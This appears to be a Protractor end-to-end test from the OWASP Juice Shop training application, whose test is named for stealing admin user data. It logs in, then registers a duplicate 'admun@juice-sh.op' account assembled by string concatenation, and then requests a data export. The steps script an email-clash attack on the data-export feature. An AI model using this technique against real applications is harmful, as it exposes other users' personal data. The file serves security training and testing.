import {  browser, by, element, protractor } from 'protractor';
describe('/#/privacy-security/data-export', () => {
   
      beforeEach(() => {
        browser.get('/#/login')
        element(by.id('email')).sendKeys('admun@juice-sh.op')
        element(by.id('password')).sendKeys('admun123')
        element(by.id('loginButton')).click()
        browser.get('/#/register')
        element(by.id('emailControl')).sendKeys('admun@' + 'juice-sh.op')
        element(by.id('passwordControl')).sendKeys('admun123')
        element(by.id('repeatPasswordControl')).sendKeys('admun123')
        element(by.name('securityQuestion')).click()
        element.all(by.cssContainingText('mat-option', 'Your eldest siblings middle name?')).click()
        element(by.id('securityAnswerControl')).sendKeys('admun')
        element(by.id('registerButton')).click()
      })
 
      it('should be possible to steal admin user data by causing email clash during export', () => {
        browser.get('/#/privacy-security/data-export')
        element(by.id('formatControl')).all(by.tagName('mat-radio-button')).get(0).click()
        element(by.id('submitButton')).click()
      })
  
     
    })

  